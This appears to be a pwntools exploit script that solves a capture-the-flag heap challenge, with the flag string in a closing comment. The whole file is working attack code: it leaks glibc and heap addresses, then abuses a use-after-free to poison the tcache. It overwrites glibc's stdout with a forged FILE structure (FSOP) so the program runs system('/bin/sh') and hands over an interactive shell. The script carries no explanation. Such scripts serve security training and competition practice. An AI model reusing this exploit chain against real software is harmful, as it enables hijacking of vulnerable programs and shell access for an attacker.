from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./pwny-heap_patched', gdbscript='''
    continue
''')

def malloc(index, size):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"index: ", str(index).encode())
    p.sendlineafter(b"size: ", str(size).encode())

def free(index):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"index: ", str(index).encode())

def view(index):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"index: ", str(index).encode())
    p.recvuntil(b": ")
    raw = p.recvuntil(b"1. ")[:-3]
    return raw

def write(index, data):
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"index: ", str(index).encode())
    p.sendlineafter(b"write something in: ", data)

# Stage 1: leak glibc base address
# allocate 9 chunks, the last one is to avoid malloc_consolidate
for i in range(9):
    malloc(i, 0xf8)
# fill tcache with 7 chunks, let the 8th chunk be freed in unsorted bin
for i in range(8):
    free(i)
glibc_base_addr = u64(view(7).ljust(8, b'\x00'))-0x21ace0
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 2: leak heap base address
heap_base_addr = ((u64(view(0).ljust(8, b'\x00'))<<12)^0)&~0xfff
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 3: tcache poisoning to trigger FSOP
glibc_e = ELF('./libc-2.35.so')
malloc(10, 0xf8)
# chunk in position 6 and 10 are the same, UAF available
free(6)
write(10, p64((glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])^((heap_base_addr+0x8a0)>>12)))
malloc(11, 0xf8)
malloc(12, 0xf8)
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18)
write(12, bytes(fake))

p.interactive()

# MVM{pwnpope_is_mining_xmr_on_your_machine_for_the_vatican}